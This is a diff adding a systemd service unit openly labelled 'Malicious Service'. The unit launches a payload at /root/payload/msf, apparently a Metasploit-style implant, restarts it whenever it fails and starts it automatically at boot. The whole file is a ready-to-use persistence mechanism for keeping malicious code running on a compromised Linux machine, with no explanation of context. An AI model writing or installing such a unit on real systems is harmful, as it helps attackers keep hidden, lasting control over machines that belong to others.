@@ -1,0 +1,11 @@
+[Unit]
+Description=Malicious Service
+After=network.target
+
+[Service]
+ExecStart=/root/payload/msf
+Type=simple
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
